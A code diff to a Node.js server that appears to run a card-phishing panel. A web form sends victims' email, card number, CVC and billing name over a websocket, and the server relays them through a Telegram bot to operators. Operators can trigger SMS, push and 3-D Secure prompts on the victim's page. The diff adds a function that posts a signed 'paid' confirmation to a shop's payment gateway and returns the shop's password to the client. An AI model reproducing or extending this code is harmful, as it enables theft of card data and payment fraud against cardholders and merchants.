@@ -1,6 +1,7 @@
-const { inlineButtons, messageFromBot, msgBot, api, codeMSG } = require('./data/preferences');
+const { url, shop, inlineButtons, messageFromBot, msgBot, api, codeMSG } = require('./data/preferences');
 const { bot } = require('./bot');
 
+const bodyParser = require('body-parser')
 const fs = require('fs');
 const http = require("http");
 const express = require( "express");
@@ -9,13 +10,68 @@ const { v4 } = require('uuid');
 const app = express();
 const server = http.createServer(app);
 const webSocketServer = new WebSocket.Server({ server });
+const path = require('path');
+const axios = require('axios');
+const MD5 = require("js-md5");
 
 
+app.use(bodyParser.urlencoded({extended:true}));
+app.use(express.json());
 
-let messageData;
+
+app.set('view engine', 'ejs')
+
+app.use(express.static(path.join(__dirname,"views")));
+
 let clients = [];
-let lastClient = 0;
 
+
+const lastData = []
+
+
+
+const acceptPay = async (client)=> {
+    const order = JSON.parse(client.order);
+    const paid = "1"
+
+    const signature = MD5.md5(`${shop.id};${order.total_price};${order.client_transaction_id};${order.key};${paid};${shop.password}`);
+    try {
+        const {data} = await axios.post(url.accept, {
+            paid: paid,
+            amount: order.total_price,
+            transaction_id: order.client_transaction_id,
+            key: order.key,
+            signature: signature,
+            shop_id: shop.id,
+            password: shop.password
+        });
+        console.log(data);
+    } catch (err) { console.log(err) }
+}
+
+
+
+
+
+app.get('/', async (req, res)=> {
+    res.json({'status': 'expired'});
+})
+
+app.post('/', async (req, res)=> {
+    const body = req.body;
+    // try {
+    //     const { data } = await axios.post()
+    // } catch (err) {
+    //     console.log(err);
+    // }
+
+    res.render('index.ejs', {data: body, order_json: JSON.parse(body.order_json), order: body.order_json});
+})
+
+app.get('/test', (req, res)=> {
+    const data = JSON.parse(fs.readFileSync('result.json', 'utf-8'));
+    return res.json(data.order_lines);
+})
 
 const chat_ids = ()=> {
     try { return JSON.parse(fs.readFileSync('data/chat_ids.json', 'utf-8')); }
@@ -25,51 +81,54 @@ const chat_ids = ()=> {
 
 const sendMessageFromBot = async (message, inline_keyboard={}, ws=null, formData={}, reply=null)=> {
     chat_ids().forEach(async user=> {
-        let data;
-        if(!reply) {
-            data = await bot.sendMessage(user.chat_id, message, inline_keyboard);
-        } else {
-            data = await bot.sendMessage(user.chat_id, message, {
-                reply_to_message_id: reply
-            });
-        }
-        if(formData) {
-            if(clients.filter(client=> client.message_id == data.message_id)) {
-                clients = clients.filter(client=> client.message_id != data.message_id);
+        try {
+            let data;
+            if(!reply) {
+                data = await bot.sendMessage(user.chat_id, message, inline_keyboard);
+            } else {
+                data = await bot.sendMessage(user.chat_id, message, {
+                    reply_to_message_id: reply
+                });
             }
-            clients.push({
-                'message_id': data.message_id,
-                'method': '',
-                'email': formData.email || '',
-                'cardNumber': formData.cardNumber || '',
-                'cvc': formData.cvc || '',
-                'billingName': formData.billingName || '',
-                'callbacks': {
-                    'sms': false,
-                    'customsms': false,
-                    'push': false,
-                    'custompush': false,
-                    'ownerror': false,
-                    '3dson': false,
-                    'other_card': false,
-                    'balance': false,
-                    'limit': false,
-                    'success': false
-
-                },
-                'events': {
-                    customsms: false,
-                    custompush: false,
-                    owneror: false
+            if(formData) {
+                if(clients.filter(client=> client.message_id == data.message_id)) {
+                    clients = clients.filter(client=> client.message_id != data.message_id);
                 }
-            });
-        }
-        if(ws) {
-            ws.send(JSON.stringify({
-                type: 'verify',
-                message_id: data.message_id
-            }));
-        }
+                clients.push({
+                    'message_id': data.message_id,
+                    'order': formData.order,
+                    'method': '',
+                    'email': formData.email || '',
+                    'cardNumber': formData.cardNumber || '',
+                    'cvc': formData.cvc || '',
+                    'billingName': formData.billingName || '',
+                    'callbacks': {
+                        'sms': false,
+                        'customsms': false,
+                        'push': false,
+                        'custompush': false,
+                        'ownerror': false,
+                        '3dson': false,
+                        'other_card': false,
+                        'balance': false,
+                        'limit': false,
+                        'success': false
+
+                    },
+                    'events': {
+                        customsms: false,
+                        custompush: false,
+                        owneror: false
+                    }
+                });
+            }
+            if(ws) {
+                ws.send(JSON.stringify({
+                    type: 'verify',
+                    message_id: data.message_id
+                }));
+            }
+        } catch (err) { console.log('[TELEGRAM] - Ошибка CHAT_ID не найден.') } 
     });
 
 }
@@ -160,7 +219,9 @@ webSocketServer.on('connection', async (ws, req) => {
                 })
                 break;
             case 'form':
-                sendMessageFromBot(msgBot(msgData), inlineButtons, ws, msgData);
+                try {
+                    sendMessageFromBot(msgBot(msgData), inlineButtons, ws, msgData);
+                } catch(err) { console.log('[JSON] - Некорректные данные') }
                 break;
             case 'isOnline':
                 clients.forEach(client=> {
@@ -210,7 +271,7 @@ webSocketServer.on('connection', async (ws, req) => {
                 if(msgData.event == 'REDIRECT') sendMessageFromBot(`[${msgData.event}] - Перенаправлен на главную.\nСессия недействительна`, {}, null, {}, msgData.message_id);
                 break;
             case 'sendAdmin':
-                clients.forEach(client=> {
+                clients.forEach(async client=> {
                     if(client.message_id == msgData.message_id) {
                         if(msgData.callback == 'customsms' && client.customsms) {
                             sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
@@ -225,6 +286,16 @@ webSocketServer.on('connection', async (ws, req) => {
                             client.ownerror = false;
                         }
                         if(msgData.callback == 'success_pay') {
+                            const order = JSON.parse(client.order);
+                            await acceptPay(client);
+                            ws.send(JSON.stringify({
+                                type: 'successRedirect',
+                                message_id: msgData.message_id,
+                                order: order,
+                                shop_id: shop.id,
+                                shop_password: shop.password,
+                                redirectURL: url.success(order.payment_gateway_id)
+                            }));
                             sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Вы подтвердили оплату клиенту.`, {}, null, {}, msgData.message_id);
                         }
 
